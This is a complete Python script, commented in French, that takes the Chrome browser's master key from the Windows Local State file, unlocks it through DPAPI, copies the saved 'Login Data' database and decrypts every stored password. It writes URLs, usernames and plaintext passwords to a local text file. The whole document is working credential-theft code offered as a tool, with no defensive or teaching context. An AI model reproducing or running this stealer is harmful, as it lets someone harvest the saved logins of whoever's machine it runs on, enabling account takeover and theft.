import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


def get_chrome_datetime(chromedate):
    """Retourne `datetime.datetime` object sous le format chrome
    Depuis que `chromedate` est formaté par le nombre de microsecondes depuis le 1er janvier 1601,"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # on décode la clé de chiffrage en Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # on retourne la clé décodée
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # vecteur initial
        iv = password[3:15]
        password = password[15:]
        # generer le cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypter les passwords
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # non supporté
            return ""

def main():
    f = open("browser_cred.txt", "w+")

    # on récupère la clé de chiffrage
    key = get_encryption_key()
    # localisation de la base de donnée sqlite de chrome
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # on copie la base de donnée dans le dossier courant car le fichier est bloqué si il est ouvert par chrome
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connexion à la base de donnée
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` est la donnée que l'on sougaite récupérer
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # on ietere sur les données récupérées
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            f.write(f"Origin URL: {origin_url}")
            f.write("\n")
            f.write(f"Action URL: {action_url}")
            f.write("\n")
            f.write(f"Username: {username}")
            f.write("\n")
            f.write(f"Password: {password}")
            f.write("\n")
        else:
            continue
        if date_created != 86400000000 and date_created:
            f.write(f"Creation date: {str(get_chrome_datetime(date_created))}")
            f.write("\n")
        if date_last_used != 86400000000 and date_last_used:
            f.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            f.write("\n")
        f.write("="*50)
        f.write("\n")
    cursor.close()
    db.close()
    f.close()
    try:
        # on essaie de supprimer la copie de la base de donnée
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()